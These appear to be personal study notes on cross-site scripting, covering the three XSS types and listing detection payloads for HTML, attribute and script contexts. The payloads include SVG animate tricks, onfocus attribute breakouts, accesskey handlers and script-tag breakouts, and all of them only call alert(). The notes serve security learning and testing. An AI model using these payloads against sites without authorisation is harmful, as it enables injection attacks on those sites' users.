XSS

* Cross Origin iframes are prevented from calling alert() from version 92 onward. Alternatively, print() function can be used for detection.


Three Types Of XSS

-> Reflected: Malicious script comes from current HTTP request
-> Stored Malicious script comes from the DB
-> Dom-based: Exists in the client-side code rather than server-side code


XSS Payloads

-> Custom tag: <xss autofocus tabindex=1 onfocus=alert(1)></xss>

-> <svg><animatetransform onbegin=alert(1) attributeName=transform>

-> By using "animate" tag, we can dynamically set attribute and values.
Example payload: 
<svg><a><animate attributeName="href" values="javascript:alert()"></animate> <text font-size="16" x="0" y="16">Click</text></a></svg>

-> If we can terminate the attribute value but cannot escape the tag, we can use a payload similar to the following:

 " autofocus onfocus=alert(document.domain) x="

-> I have injected the above payload inside "input" tag and it worked.

-> javascript:alert() payload is used when user supplied input is directly placed into href tag. 

-> We can make use of canonical tags for XSS detection. 
Example payloads: 
- <input type="hidden" accesskey="X" onclick="alert(1)">
- <link rel="canonical" accesskey="X" onclick="alert(1)" />
But user is required to press some extra keyboard buttons to trigger the XSS payload.

* If the current attack surface is inside javaScript part of the HTML context, we can still exploit it even if backslashes and single quotes are escaped.
Example payload:
-> </script> <img src=x onerror=alert(1)>

The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The


Example payloads when the target context is inside JavaScript part of the HTML ( <script></script>):
-> '-alert(document.domain)-'
-> ';alert(document.domain)//

* If single quotes are escaped, backslashes should also be esaceped. Assuming the target context is within the JavaScript part.

